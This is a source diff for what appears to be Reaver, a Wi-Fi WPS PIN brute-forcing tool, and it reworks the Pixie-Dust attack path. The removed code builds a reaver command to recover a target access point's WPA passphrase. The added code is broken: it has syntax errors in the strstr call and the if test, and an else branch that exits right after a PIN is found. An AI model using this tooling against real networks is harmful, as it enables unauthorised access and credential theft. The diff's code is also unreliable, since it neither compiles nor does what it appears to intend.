@@ -1859,29 +1859,33 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
             printf("[Pixie-Dust]  %s", pixie_buf_aux);
  
             aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin not found");
-            if(aux_pixie_pin != NULL)
+            if( aux_pixie_pin != NULL)
             {
 		pixie_test = 0;
 		//exit(0);
             }
-            
-            aux_pixie_pin = strstr(pixie_buf_aux,"WPS pin:");
-            if(aux_pixie_pin != NULL)
+            else
+            {
+                //output pixiewps change?
+               exit(0);
+            }
+
+            aux_pixie_pin = strstr(pixie_buf_aux,,"WPS pin:");
+            if(aux_pixie_pin)!= NULL)
             {
                 pixie_test = 1;
                 //exit(0);
                 //here will get the pin
                 strncpy(pixie_pin, aux_pixie_pin+9, 8);
             }
-            
+            else
+            {
+                //output pixiewps is change?
+               exit(0);
+            }
 
            
             
-        }
-
-        if(pclose(fpixe))  {
-            //printf("Command not found or exited with error status\n");
-            //return -1;
         }
 
         if(pixie_test == 1)
@@ -1890,64 +1894,11 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 
             FILE *fpixe_test;
 
-            //strcat(globule->cmd_reaver_test," -p ");
-            //strcat(globule->cmd_reaver_test,pixie_pin);
-            
-            char cmd_reaver_test_aux[4000];
-	    char cmd_buf_c[5];
-            
-            memset(cmd_reaver_test_aux, 0, sizeof(cmd_reaver_test_aux));
-            memset(cmd_buf_c, 0, sizeof(cmd_buf_c));
-            
-            strcat(cmd_reaver_test_aux,"./reaver -i ");
-            strcat(cmd_reaver_test_aux,get_iface());
-
-            strcat(cmd_reaver_test_aux," -b ");
-            strcat(cmd_reaver_test_aux,mac2str(get_bssid(),':'));
             
 
-            
-            strcat(cmd_reaver_test_aux," -c ");
-            snprintf(cmd_buf_c, sizeof(cmd_buf_c), "%d",get_channel());
-            strcat(cmd_reaver_test_aux,cmd_buf_c);
-
-            strcat(cmd_reaver_test_aux," -s y -p ");
-            strcat(cmd_reaver_test_aux,pixie_pin);
-            //printf("-- %s\n",cmd_reaver_test_aux);
-
-            if ((fpixe_test = popen(cmd_reaver_test_aux, "r")) == NULL) {
+            if ((fpixe_test = popen(cmd_pixie, "r")) == NULL) {
                 printf("Error opening pipe!\n");
                 //return -1;
-            }
-            
-
-            printf("Running the reaver with the correct pin wait ...\n\n");
-            printf("[Reaver Test] BSSID: %s\n", mac2str(get_bssid(),':'));
-            printf("[Reaver Test] Channel: %s\n", cmd_buf_c);
-            //printf("Command : \n", globule->cmd_reaver_test);
-            while (fgets(pixie_buf_aux2, 4000, fpixe_test) != NULL) 
-            {
-                
-	       if(strstr(pixie_buf_aux2,"[+] WPS PIN:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
-                if(strstr(pixie_buf_aux2,"[+] WPA PSK:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
-               if(strstr(pixie_buf_aux2,"[+] AP SSID:")!=NULL)
-               {
-                   printf("[Reaver Test] %s", pixie_buf_aux2);
-               }
-
-
-
-            }
-
-            if(pclose(fpixe_test))  {
-            //printf("Command not found or exited with error status\n");
-            //return -1;
             }
 
 
@@ -1958,6 +1909,12 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
         else
         {
             exit(0);
+        }
+
+
+        if(pclose(fpixe))  {
+            //printf("Command not found or exited with error status\n");
+            //return -1;
         }
 
     }
